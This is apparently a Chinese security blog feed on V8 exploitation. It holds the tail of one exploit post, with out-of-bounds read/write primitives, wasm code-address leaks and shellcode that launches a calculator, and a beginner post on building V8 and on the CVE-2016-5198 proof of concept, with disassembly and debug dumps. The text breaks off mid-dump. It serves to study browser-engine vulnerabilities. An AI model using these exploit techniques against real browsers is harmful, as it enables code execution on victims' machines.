class="hljs-title">writePtr</span>(<span class="hljs-params">offset, address, value</span>)</span>&#123;<br>  oob_double_Array[offset] = address;<br>  fake_dv = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Float64Array</span>(oob_buffer);<br>  fake_dv[<span class="hljs-number">0</span>] = value;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readPtr</span>(<span class="hljs-params">offset, address</span>)</span>&#123;<br>  oob_double_Array[offset] = address;<br>  fake_dv = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Float64Array</span>(oob_buffer);<br>  <span class="hljs-keyword">return</span> fake_dv[<span class="hljs-number">0</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>往object_Array[1]写值通过oob_double_Array[23]来leak</p><p>下面申请一个ArrayBuffer，因为ArrayBuffer偏移不定这边需要求个offset</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript">oob_buffer_addr = user_space_read(oob_buffer);<br><span class="hljs-comment">//console.log(&quot;[+] ob_buffer addr is at &quot; + Int64.fromDouble(oob_buffer_addr).toString());</span><br><br>oob_array_addr = user_space_read(oob_double_Array);<br><span class="hljs-comment">//console.log(&quot;[+] oob_double_Array addr is at &quot; + Int64.fromDouble(oob_array_addr).toString());</span><br>temp1 = Int64.fromDouble(oob_buffer_addr + <span class="hljs-keyword">new</span> Int64(<span class="hljs-number">0x1f</span>).asDouble() - oob_array_addr + <span class="hljs-keyword">new</span> Int64(<span class="hljs-number">0x81</span>).asDouble());<br>offset = lowerint(temp1) / <span class="hljs-number">8</span>;<br><span class="hljs-built_in">console</span>.log(offset.toString());<br></code></pre></td></tr></table></figure><p>通过leak俩地址然后计算偏移后除8即可计算出backingstore的index</p><p>接下去要leak出code地址，因为这边用的是wasm，不是jsfunction</p><p>先找偏移0x18 leak出shared_info然后通过偏移0x8 leak出wasm_exported_function_data然后是偏移0x10处leak出wasm instance地址，wasm instance偏移0xc0处就是code地址</p><p>//32位和64位不同，这边是64位下的偏移</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs javascript">shared_info = readPtr(offset, function_addr + <span class="hljs-keyword">new</span> Int64(<span class="hljs-number">0x17</span>).asDouble());<br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[+] shared_info is at &quot;</span> + Int64.fromDouble(shared_info).toString());<br><br>wasm_exported_function_data = readPtr(offset, shared_info + <span class="hljs-keyword">new</span> Int64(<span class="hljs-number">0x7</span>).asDouble());<br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[+] wasm_exported_function_data is at &quot;</span> + Int64.fromDouble(wasm_exported_function_data).toString());<br><br>instance = readPtr(offset, wasm_exported_function_data + <span class="hljs-keyword">new</span> Int64(<span class="hljs-number">0xf</span>).asDouble());<br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[+] instance is at &quot;</span> + Int64.fromDouble(instance).toString());<br><span class="hljs-comment">//----------imported_function_targets is not double---------------</span><br>oob_double_Array[offset] = instance + <span class="hljs-keyword">new</span> Int64(<span class="hljs-number">0xbf</span>).asDouble(); <span class="hljs-comment">//backing store</span><br><span class="hljs-keyword">var</span> ift_buffer = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint32Array</span>(oob_buffer);<br>imported_function_targets = d2u(ift_buffer[<span class="hljs-number">0</span>],ift_buffer[<span class="hljs-number">1</span>]);<br><span class="hljs-built_in">console</span>.log(ift_buffer[<span class="hljs-number">0</span>]);<br><span class="hljs-built_in">console</span>.log(ift_buffer[<span class="hljs-number">1</span>]);<br><br><span class="hljs-comment">//imported_function_targets = readPtr(offset, instance + new Int64(0xc7).asDouble());</span><br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[+] imported_function_targets is at &quot;</span> + Int64.fromDouble(imported_function_targets).toString());<br><br>code_addr = readPtr(offset, imported_function_targets);<br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[+] code_addr is at &quot;</span> + Int64.fromDouble(code_addr).toString());<br><br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;GT5&quot;</span>);<br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[+] the f() code addr is at &quot;</span> + Int64.fromDouble(code_addr).toString());<br>f();<br>%SystemBreak();<br></code></pre></td></tr></table></figure><p>最后就是把code地址写入backingstore然后覆写shellcode执行</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs javascript">oob_double_Array[offset] = code_addr; <span class="hljs-comment">//backing store</span><br><br><span class="hljs-keyword">var</span> shellcode = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint32Array</span>(oob_buffer);<br>shellcode[<span class="hljs-number">0</span>] = <span class="hljs-number">0x90909090</span>;<br>shellcode[<span class="hljs-number">1</span>] = <span class="hljs-number">0x90909090</span>;<br>shellcode[<span class="hljs-number">2</span>] = <span class="hljs-number">0x782fb848</span>;<br>shellcode[<span class="hljs-number">3</span>] = <span class="hljs-number">0x636c6163</span>;<br>shellcode[<span class="hljs-number">4</span>] = <span class="hljs-number">0x48500000</span>;<br>shellcode[<span class="hljs-number">5</span>] = <span class="hljs-number">0x73752fb8</span>;<br>shellcode[<span class="hljs-number">6</span>] = <span class="hljs-number">0x69622f72</span>;<br>shellcode[<span class="hljs-number">7</span>] = <span class="hljs-number">0x8948506e</span>;<br>shellcode[<span class="hljs-number">8</span>] = <span class="hljs-number">0xc03148e7</span>;<br>shellcode[<span class="hljs-number">9</span>] = <span class="hljs-number">0x89485750</span>;<br>shellcode[<span class="hljs-number">10</span>] = <span class="hljs-number">0xd23148e6</span>;<br>shellcode[<span class="hljs-number">11</span>] = <span class="hljs-number">0x3ac0c748</span>;<br>shellcode[<span class="hljs-number">12</span>] = <span class="hljs-number">0x50000030</span>;<br>shellcode[<span class="hljs-number">13</span>] = <span class="hljs-number">0x4944b848</span>;<br>shellcode[<span class="hljs-number">14</span>] = <span class="hljs-number">0x414c5053</span>;<br>shellcode[<span class="hljs-number">15</span>] = <span class="hljs-number">0x48503d59</span>;<br>shellcode[<span class="hljs-number">16</span>] = <span class="hljs-number">0x3148e289</span>;<br>shellcode[<span class="hljs-number">17</span>] = <span class="hljs-number">0x485250c0</span>;<br>shellcode[<span class="hljs-number">18</span>] = <span class="hljs-number">0xc748e289</span>;<br>shellcode[<span class="hljs-number">19</span>] = <span class="hljs-number">0x00003bc0</span>;<br>shellcode[<span class="hljs-number">20</span>] = <span class="hljs-number">0x050f00</span>;<br><br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;GT6&quot;</span>);<br>%DebugPrint(f);<br>%SystemBreak();<br><br>f();<br></code></pre></td></tr></table></figure><p>完美弹出计算器</p>]]></content>
    
    
    
    <tags>
      
      <tag>v8</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>v8入门</title>
    <link href="/2022/03/21/v8%E5%85%A5%E9%97%A8/"/>
    <url>/2022/03/21/v8%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<p>从0到1，去年5月复现过几个漏洞现在全忘了，重新写下方便以后复习。</p><a id="more"></a><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>因为之前是在公司里配置的没有考虑过代理的问题直接可以访问，自己配置的时候需要配置下代理</p><p>我这边用的是clash，需要注意启动时候sudo权限</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">git<span class="hljs-built_in"> config </span>--global http.proxy 127.0.0.1:7890<br>gedit ~/.bashrc<br><span class="hljs-comment">#在最后加上</span><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">http_proxy</span>=<span class="hljs-string">&quot;127.0.0.1:7890&quot;</span><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">https_proxy</span>=<span class="hljs-variable">$http_proxy</span><br></code></pre></td></tr></table></figure><p>下面安装下depot_tools和ninja即可</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">git clone https:<span class="hljs-string">//chromium.googlesource.com/chromium/tools/depot_tools.git</span><br><span class="hljs-keyword">echo</span> &#x27;export PATH=$PATH:<span class="hljs-string">&quot;/home/pisanbao/v8/v8/depot_tools&quot;</span>&#x27; &gt;&gt; ~<span class="hljs-string">/.bashrc</span><br>git clone https:<span class="hljs-string">//github.com/ninja-build/ninja.git</span><br><span class="hljs-keyword">cd</span> ninja<br><span class="hljs-string">./configure.py</span> <span class="hljs-params">--bootstrap</span> <br><span class="hljs-keyword">cd</span> <span class="hljs-string">..</span><br><span class="hljs-keyword">echo</span> &#x27;export PATH=$PATH:<span class="hljs-string">&quot;/home/pisanbao/v8/ninja&quot;</span>&#x27; &gt;&gt; ~<span class="hljs-string">/.bashrc</span><br></code></pre></td></tr></table></figure><p>接下去fetch v8然后编译</p><p>//报command not found就起bash</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">fetch</span> v<span class="hljs-number">8</span><br><span class="hljs-attribute">cd</span> v<span class="hljs-number">8</span><br><span class="hljs-attribute">git</span> checkout 版本号<br><span class="hljs-attribute">gclient</span> sync<br><br><span class="hljs-attribute">tools</span>/dev/v<span class="hljs-number">8</span>gen.py x<span class="hljs-number">64</span>.debug<br><span class="hljs-attribute">ninja</span> -C out.gn/x<span class="hljs-number">64</span>.debug<br><span class="hljs-comment">#release版本吧debug改成release即可</span><br><span class="hljs-comment">#如果是32位吧x64改成ia32即可</span><br></code></pre></td></tr></table></figure><p>接着修改下gdbinit，为了方便调试</p><p><img src="image-20220321150645517.png" alt="image-20220321150645517"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm">v<span class="hljs-number">8</span>提供了一些指令方便调试<br>使用<span class="hljs-variable">%DebugPrint</span>(<span class="hljs-keyword">x</span>)<span class="hljs-comment">;来输出变量x的相关信息</span><br>使用<span class="hljs-variable">%SystemBreak</span>()<span class="hljs-comment">;来抛出int3，以便让gdb进行调试</span><br>./d<span class="hljs-number">8</span> --allow-natives-syntax exp.js<br>#参数--allow-natives-syntax记得加上<br></code></pre></td></tr></table></figure><h1 id="CVE-2016-5198"><a href="#CVE-2016-5198" class="headerlink" title="CVE-2016-5198"></a>CVE-2016-5198</h1><p><a href="https://eternalsakura13.com/2019/04/29/CVE-2016-5198/#more">https://eternalsakura13.com/2019/04/29/CVE-2016-5198/#more</a></p><p>具体可以看sakura的blog，写的特棒，当初也是看这个入门的。</p><p>这个漏洞也是比较经典的利用</p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Ctor</span>(<span class="hljs-params"></span>) </span>&#123;<br>    n = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Set</span>();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Check</span>(<span class="hljs-params"></span>) </span>&#123;<br>    n.xyz = <span class="hljs-number">0x826852f4</span>;<br>    <span class="hljs-built_in">parseInt</span>(<span class="hljs-string">&#x27;AAAAAAAA&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">2000</span>; ++i) &#123;<br>    Ctor();<br>&#125;<br><br><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">2000</span>; ++i) &#123;<br>    Check();<br>&#125;<br><br>Ctor();<br>Check();<br>print(<span class="hljs-string">&quot;finish&quot;</span>);<br></code></pre></td></tr></table></figure><p>具体配合调试来看，优化后的check如下</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; job <span class="hljs-number">0</span>xea<span class="hljs-number">1</span>bd<span class="hljs-number">606</span>f<span class="hljs-number">21</span><br><span class="hljs-attribute">0xea1bd606f21</span>:<span class="hljs-meta"> [Code]</span><br><span class="hljs-attribute">kind</span> = OPTIMIZED_FUNCTION<br><span class="hljs-attribute">stack_slots</span> = <span class="hljs-number">5</span><br><span class="hljs-attribute">compiler</span> = crankshaft<br><span class="hljs-attribute">Instructions</span> (size = <span class="hljs-number">186</span>)<br><span class="hljs-attribute">0xea1bd606f80</span>     <span class="hljs-number">0</span>  <span class="hljs-number">55</span>             push rbp<br><span class="hljs-attribute">0xea1bd606f81</span>     <span class="hljs-number">1</span>  <span class="hljs-number">4889</span>e<span class="hljs-number">5</span>         REX.W movq rbp,rsp<br><span class="hljs-attribute">0xea1bd606f84</span>     <span class="hljs-number">4</span>  <span class="hljs-number">56</span>             push rsi<br><span class="hljs-attribute">0xea1bd606f85</span>     <span class="hljs-number">5</span>  <span class="hljs-number">57</span>             push rdi<br><span class="hljs-attribute">0xea1bd606f86</span>     <span class="hljs-number">6</span>  <span class="hljs-number">4883</span>ec<span class="hljs-number">08</span>       REX.W subq rsp,<span class="hljs-number">0</span>x<span class="hljs-number">8</span><br><span class="hljs-attribute">0xea1bd606f8a</span>    <span class="hljs-number">10</span>  <span class="hljs-number">488</span>b<span class="hljs-number">45</span>f<span class="hljs-number">8</span>       REX.W movq rax,[rbp-<span class="hljs-number">0</span>x<span class="hljs-number">8</span>]<br><span class="hljs-attribute">0xea1bd606f8e</span>    <span class="hljs-number">14</span>  <span class="hljs-number">488945</span>e<span class="hljs-number">8</span>       REX.W movq<span class="hljs-meta"> [rbp-0x18],rax</span><br><span class="hljs-meta">0xea1bd606f92    18  488bf0         REX.W movq rsi,rax</span><br><span class="hljs-meta">0xea1bd606f95    21  493ba5600c0000 REX.W cmpq rsp,[r13+0xc60]</span><br><span class="hljs-attribute">0xea1bd606f9c</span>    <span class="hljs-number">28</span>  <span class="hljs-number">7305</span>           jnc <span class="hljs-number">35</span>  (<span class="hljs-number">0</span>xea<span class="hljs-number">1</span>bd<span class="hljs-number">606</span>fa<span class="hljs-number">3</span>)<br><span class="hljs-attribute">0xea1bd606f9e</span>    <span class="hljs-number">30</span>  e<span class="hljs-number">83</span>db<span class="hljs-number">9</span>f<span class="hljs-number">5</span>ff     call StackCheck  (<span class="hljs-number">0</span>xea<span class="hljs-number">1</span>bd<span class="hljs-number">5628</span>e<span class="hljs-number">0</span>)    ;; code: BUILTIN<br><span class="hljs-attribute">0xea1bd606fa3</span>    <span class="hljs-number">35</span>  <span class="hljs-number">48</span>b<span class="hljs-number">821</span>c<span class="hljs-number">09</span>aff<span class="hljs-number">94310000</span> REX.W movq rax,<span class="hljs-number">0</span>x<span class="hljs-number">3194</span>ff<span class="hljs-number">9</span>ac<span class="hljs-number">021</span>    ;; object: <span class="hljs-number">0</span>x<span class="hljs-number">3194</span>ff<span class="hljs-number">9</span>ac<span class="hljs-number">021</span> PropertyCell for <span class="hljs-number">0</span>x<span class="hljs-number">29139</span>a<span class="hljs-number">15</span>c<span class="hljs-number">631</span> &lt;a Set with map <span class="hljs-number">0</span>x<span class="hljs-number">3</span>a<span class="hljs-number">202</span>ca<span class="hljs-number">86509</span>&gt;<br><span class="hljs-attribute">0xea1bd606fad</span>    <span class="hljs-number">45</span>  <span class="hljs-number">488</span>b<span class="hljs-number">400</span>f       REX.W movq rax,[rax+<span class="hljs-number">0</span>xf]<br><span class="hljs-attribute">0xea1bd606fb1</span>    <span class="hljs-number">49</span>  <span class="hljs-number">49</span>ba<span class="hljs-number">0000805</span>e<span class="hljs-number">0</span>a<span class="hljs-number">4</span>de<span class="hljs-number">041</span> REX.W movq r<span class="hljs-number">10</span>,<span class="hljs-number">0</span>x<span class="hljs-number">41</span>e<span class="hljs-number">04</span>d<span class="hljs-number">0</span>a<span class="hljs-number">5</span>e<span class="hljs-number">800000</span><br><span class="hljs-attribute">0xea1bd606fbb</span>    <span class="hljs-number">59</span>  c<span class="hljs-number">4</span>c<span class="hljs-number">1</span>f<span class="hljs-number">96</span>ec<span class="hljs-number">2</span>     vmovq xmm<span class="hljs-number">0</span>,r<span class="hljs-number">10</span><br><span class="hljs-attribute">0xea1bd606fc0</span>    <span class="hljs-number">64</span>  <span class="hljs-number">488</span>b<span class="hljs-number">4007</span>       REX.W movq rax,[rax+<span class="hljs-number">0</span>x<span class="hljs-number">7</span>]<br><span class="hljs-attribute">0xea1bd606fc4</span>    <span class="hljs-number">68</span>  <span class="hljs-number">488</span>b<span class="hljs-number">400</span>f       REX.W movq rax,[rax+<span class="hljs-number">0</span>xf]<br><span class="hljs-attribute">0xea1bd606fc8</span>    <span class="hljs-number">72</span>  c<span class="hljs-number">5</span>fb<span class="hljs-number">114007</span>     vmovsd<span class="hljs-meta"> [rax+0x7],xmm0</span><br><span class="hljs-meta">0xea1bd606fcd    77  49ba112358a9d43b0000 REX.W movq r10,0x3bd4a9582311    ;; object: 0x3bd4a9582311 &lt;undefined&gt;</span><br><span class="hljs-meta">0xea1bd606fd7    87  4152           push r10</span><br><span class="hljs-meta">0xea1bd606fd9    89  49ba39b09aff94310000 REX.W movq r10,0x3194ff9ab039    ;; object: 0x3194ff9ab039 &lt;String[8]: AAAAAAAA&gt;</span><br><span class="hljs-meta">0xea1bd606fe3    99  4152           push r10</span><br><span class="hljs-meta">0xea1bd606fe5   101  48bf51d898ff94310000 REX.W movq rdi,0x3194ff98d851    ;; object: 0x3194ff98d851 &lt;JS Function parseInt (SharedFunctionInfo 0x3bd4a95bce11)&gt;</span><br><span class="hljs-meta">0xea1bd606fef   111  488b75e8       REX.W movq rsi,[rbp-0x18]</span><br><span class="hljs-attribute">0xea1bd606ff3</span>   <span class="hljs-number">115</span>  <span class="hljs-number">488</span>b<span class="hljs-number">7727</span>       REX.W movq rsi,[rdi+<span class="hljs-number">0</span>x<span class="hljs-number">27</span>]<br><span class="hljs-attribute">0xea1bd606ff7</span>   <span class="hljs-number">119</span>  <span class="hljs-number">498</span>b<span class="hljs-number">55</span>a<span class="hljs-number">0</span>       REX.W movq rdx,[r<span class="hljs-number">13</span>-<span class="hljs-number">0</span>x<span class="hljs-number">60</span>]<br><span class="hljs-attribute">0xea1bd606ffb</span>   <span class="hljs-number">123</span>  b<span class="hljs-number">801000000</span>     movl rax,<span class="hljs-number">0</span>x<span class="hljs-number">1</span><br><span class="hljs-attribute">0xea1bd607000</span>   <span class="hljs-number">128</span>  bb<span class="hljs-number">02000000</span>     movl rbx,<span class="hljs-number">0</span>x<span class="hljs-number">2</span><br><span class="hljs-attribute">0xea1bd607005</span>   <span class="hljs-number">133</span>  e<span class="hljs-number">8</span>f<span class="hljs-number">6</span>ebefff     call ArgumentsAdaptorTrampoline  (<span class="hljs-number">0</span>xea<span class="hljs-number">1</span>bd<span class="hljs-number">505</span>c<span class="hljs-number">00</span>)    ;; code: BUILTIN<br><span class="hljs-attribute">0xea1bd60700a</span>   <span class="hljs-number">138</span>  <span class="hljs-number">48</span>b<span class="hljs-number">8112358</span>a<span class="hljs-number">9</span>d<span class="hljs-number">43</span>b<span class="hljs-number">0000</span> REX.W movq rax,<span class="hljs-number">0</span>x<span class="hljs-number">3</span>bd<span class="hljs-number">4</span>a<span class="hljs-number">9582311</span>    ;; object: <span class="hljs-number">0</span>x<span class="hljs-number">3</span>bd<span class="hljs-number">4</span>a<span class="hljs-number">9582311</span> &lt;undefined&gt;<br><span class="hljs-attribute">0xea1bd607014</span>   <span class="hljs-number">148</span>  <span class="hljs-number">488</span>be<span class="hljs-number">5</span>         REX.W movq rsp,rbp<br><span class="hljs-attribute">0xea1bd607017</span>   <span class="hljs-number">151</span>  <span class="hljs-number">5</span>d             pop rbp<br><span class="hljs-attribute">0xea1bd607018</span>   <span class="hljs-number">152</span>  c<span class="hljs-number">20800</span>         ret <span class="hljs-number">0</span>x<span class="hljs-number">8</span><br><span class="hljs-attribute">0xea1bd60701b</span>   <span class="hljs-number">155</span>  <span class="hljs-number">90</span>             nop<br><br><span class="hljs-attribute">Source</span> positions:<br> <span class="hljs-attribute">pc</span> offset  position<br>        <span class="hljs-attribute">77</span>        <span class="hljs-number">87</span><br>        <span class="hljs-attribute">89</span>        <span class="hljs-number">87</span><br>        <span class="hljs-attribute">89</span>        <span class="hljs-number">87</span><br>       <span class="hljs-attribute">101</span>        <span class="hljs-number">87</span><br>       <span class="hljs-attribute">101</span>        <span class="hljs-number">87</span><br>       <span class="hljs-attribute">111</span>        <span class="hljs-number">87</span><br>       <span class="hljs-attribute">115</span>        <span class="hljs-number">87</span><br>       <span class="hljs-attribute">138</span>        <span class="hljs-number">87</span><br>       <span class="hljs-attribute">138</span>        <span class="hljs-number">87</span><br>       <span class="hljs-attribute">138</span>        <span class="hljs-number">87</span><br>       <span class="hljs-attribute">148</span>        <span class="hljs-number">87</span><br>       <span class="hljs-attribute">155</span>        <span class="hljs-number">87</span><br><br><span class="hljs-attribute">Inlined</span> functions (count = <span class="hljs-number">0</span>)<br><br><span class="hljs-attribute">Deoptimization</span> Input Data (deopt points = <span class="hljs-number">2</span>)<br> <span class="hljs-attribute">index</span>  ast id    argc     pc<br>     <span class="hljs-attribute">0</span>       <span class="hljs-number">4</span>       <span class="hljs-number">0</span>     <span class="hljs-number">35</span><br>     <span class="hljs-attribute">1</span>      <span class="hljs-number">21</span>       <span class="hljs-number">0</span>    <span class="hljs-number">138</span><br><br><span class="hljs-attribute">Safepoints</span> (size = <span class="hljs-number">30</span>)<br><span class="hljs-attribute">0xea1bd606fa3</span>    <span class="hljs-number">35</span>  <span class="hljs-number">10000</span> (sp -&gt; fp)       <span class="hljs-number">0</span><br><span class="hljs-attribute">0xea1bd60700a</span>   <span class="hljs-number">138</span>  <span class="hljs-number">10000</span> (sp -&gt; fp)       <span class="hljs-number">1</span><br><br><span class="hljs-attribute">RelocInfo</span> (size = <span class="hljs-number">7</span>)<br><span class="hljs-attribute">0xea1bd606f9f</span>  code target (BUILTIN)  (<span class="hljs-number">0</span>xea<span class="hljs-number">1</span>bd<span class="hljs-number">5628</span>e<span class="hljs-number">0</span>)<br><span class="hljs-attribute">0xea1bd606fa5</span>  embedded object  (<span class="hljs-number">0</span>x<span class="hljs-number">3194</span>ff<span class="hljs-number">9</span>ac<span class="hljs-number">021</span> PropertyCell for <span class="hljs-number">0</span>x<span class="hljs-number">29139</span>a<span class="hljs-number">15</span>c<span class="hljs-number">631</span> &lt;a Set with map <span class="hljs-number">0</span>x<span class="hljs-number">3</span>a<span class="hljs-number">202</span>ca<span class="hljs-number">86509</span>&gt;)<br><span class="hljs-attribute">0xea1bd606fcf</span>  embedded object  (<span class="hljs-number">0</span>x<span class="hljs-number">3</span>bd<span class="hljs-number">4</span>a<span class="hljs-number">9582311</span> &lt;undefined&gt;)<br><span class="hljs-attribute">0xea1bd606fdb</span>  embedded object  (<span class="hljs-number">0</span>x<span class="hljs-number">3194</span>ff<span class="hljs-number">9</span>ab<span class="hljs-number">039</span> &lt;String[<span class="hljs-number">8</span>]: AAAAAAAA&gt;)<br><span class="hljs-attribute">0xea1bd606fe7</span>  embedded object  (<span class="hljs-number">0</span>x<span class="hljs-number">3194</span>ff<span class="hljs-number">98</span>d<span class="hljs-number">851</span> &lt;JS Function parseInt (SharedFunctionInfo <span class="hljs-number">0</span>x<span class="hljs-number">3</span>bd<span class="hljs-number">4</span>a<span class="hljs-number">95</span>bce<span class="hljs-number">11</span>)&gt;)<br><span class="hljs-attribute">0xea1bd607006</span>  code target (BUILTIN)  (<span class="hljs-number">0</span>xea<span class="hljs-number">1</span>bd<span class="hljs-number">505</span>c<span class="hljs-number">00</span>)<br><span class="hljs-attribute">0xea1bd60700c</span>  embedded object  (<span class="hljs-number">0</span>x<span class="hljs-number">3</span>bd<span class="hljs-number">4</span>a<span class="hljs-number">9582311</span> &lt;undefined&gt;)<br></code></pre></td></tr></table></figure><p><img src="image-20220322161721309.png" alt="image-20220322161721309"></p><p>断点断下，此时rax是n的地址</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs delphi">DebugPrint: <span class="hljs-number">0</span>x29139a15c631: [JSSet]<br> - map = <span class="hljs-number">0</span>x3a202ca86509 [FastProperties]<br> - prototype = <span class="hljs-number">0</span>x3194ff995e49<br> - elements = <span class="hljs-number">0</span>x3bd4a9582241 &lt;FixedArray[<span class="hljs-number">0</span>]&gt; [FAST_HOLEY_SMI_ELEMENTS] - table = <span class="hljs-number">0</span>x29139a15c651 &lt;FixedArray[<span class="hljs-number">13</span>]&gt;<br> - properties = <span class="hljs-comment">&#123;</span><br><span class="hljs-comment"> &#125;</span><br><span class="hljs-number">0</span>x3a202ca86509: [Map]<br> - <span class="hljs-keyword">type</span>: JS_SET_TYPE<br> - instance size: <span class="hljs-number">32</span><br> - inobject properties: <span class="hljs-number">0</span><br> - elements kind: FAST_HOLEY_SMI_ELEMENTS<br> - unused <span class="hljs-keyword">property</span> fields: <span 